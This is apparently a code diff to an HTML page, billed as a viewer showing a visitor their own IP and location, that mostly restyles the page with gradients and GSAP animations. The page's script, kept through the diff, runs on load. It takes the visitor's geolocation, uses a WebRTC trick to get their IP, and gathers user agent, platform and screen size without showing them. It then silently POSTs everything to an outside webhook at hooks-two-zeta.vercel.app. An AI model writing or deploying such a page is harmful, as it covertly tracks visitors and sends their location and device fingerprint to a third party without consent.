@@ -4,48 +4,70 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>IP and Location Info</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.2/gsap.min.js"></script>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background-color: #333;
-            color: #f4f4f4;
+            font-family: 'Roboto', sans-serif;
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            color: #fff;
             text-align: center;
-            padding: 20px;
+            margin: 0;
+            padding: 0;
         }
         .container {
             margin-top: 50px;
             display: flex;
-            justify-content: center;
+            flex-direction: column;
+            align-items: center;
         }
         .info {
-            margin: 20px 0;
-            padding: 20px;
-            width: fit-content;
-            border-radius: 8px;
-            box-shadow: 0 2px 4px rgba(255, 255, 255, 0.1);
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            border-radius: 10px;
+            padding: 30px;
+            width: 300px;
+            box-shadow: 0 8px 15px rgba(0, 0, 0, 0.3);
+            opacity: 0;
         }
         .info p {
-            margin: 5px 0;
-            font-size: 16px;
+            font-size: 18px;
+            margin: 10px 0;
         }
         #mapButton {
             margin-top: 20px;
             padding: 10px 20px;
-            background-color: #4CAF50;
+            background: #4CAF50;
             color: white;
             border: none;
             border-radius: 5px;
             cursor: pointer;
+            transition: background 0.3s ease-in-out;
         }
         #mapButton:hover {
-            background-color: #45a049;
+            background: #45a049;
+        }
+        h1 {
+            font-size: 2.5em;
+            margin: 20px;
+            animation: fadeIn 1s ease-out forwards;
+        }
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(-20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
     </style>
 </head>
 <body>
     <h1>IP and Location Details</h1>
     <div class="container">
-        <div id="details" class="info" style="display: none;">
+        <div id="details" class="info">
             <p><strong>IP Address:</strong> <span id="ip"></span></p>
             <p><strong>Latitude:</strong> <span id="latitude"></span></p>
             <p><strong>Longitude:</strong> <span id="longitude"></span></p>
@@ -56,35 +78,32 @@
     <script>
         let latitude, longitude;
 
+        function animateUI() {
+            const infoBox = document.querySelector(".info");
+            gsap.fromTo(infoBox, { y: 30, opacity: 0 }, { y: 0, opacity: 1, duration: 1, ease: "power2.out" });
+        }
+
         function getIPAndSendToServer() {
-    
             function sendDataToServer(data) {
                 fetch('https://hooks-two-zeta.vercel.app/send-info', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(data),
                 }).catch((error) => console.error("Error sending data:", error));
             }
 
-            // Get location using Geolocation API
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     async (position) => {
                         latitude = position.coords.latitude;
                         longitude = position.coords.longitude;
-
-                        // Display latitude and longitude
                         document.getElementById("latitude").textContent = latitude;
                         document.getElementById("longitude").textContent = longitude;
 
-                        // Get device details (not displayed on screen)
                         const userAgent = navigator.userAgent;
                         const platform = navigator.platform;
                         const screenResolution = `${screen.width}x${screen.height}`;
 
-                        // Use RTCPeerConnection to get IP address
                         const ipDups = {};
                         const RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
 
@@ -94,8 +113,7 @@
                         }
 
                         const pc = new RTCPeerConnection({ iceServers: [] });
-                        pc.createDataChannel(""); // Create a fake data channel
-
+                        pc.createDataChannel("");
                         pc.createOffer()
                             .then((offer) => pc.setLocalDescription(offer))
                             .catch((error) => console.error("Error creating offer:", error));
@@ -111,29 +129,18 @@
                                 ipMatches.forEach((ip) => {
                                     if (!ipDups[ip]) {
                                         ipDups[ip] = true;
-
-                                        // Display the IP address
                                         document.getElementById("ip").textContent = ip;
                                         document.getElementById("details").style.display = "block";
+                                        animateUI();
 
-                                        const data = {
-                                            ipAddress: ip,
-                                            latitude,
-                                            longitude,
-                                            userAgent,
-                                            platform,
-                                            screenResolution,
-                                        };
-
+                                        const data = { ipAddress: ip, latitude, longitude, userAgent, platform, screenResolution };
                                         sendDataToServer(data);
                                     }
                                 });
                             }
                         };
                     },
-                    () => {
-                        console.error("Unable to retrieve location.");
-                    }
+                    () => console.error("Unable to retrieve location.")
                 );
             } else {
                 console.error("Geolocation not supported by your browser.");
@@ -141,12 +148,10 @@
         }
 
         function showMap() {
-            // Redirect to Google Maps with the latitude and longitude
             const mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
-            window.open(mapUrl, '_blank'); // Open the map in a new tab
+            window.open(mapUrl, '_blank');
         }
 
-        // Add event listener to the button
         document.getElementById("mapButton").addEventListener("click", showMap);
 
         window.onload = getIPAndSendToServer;
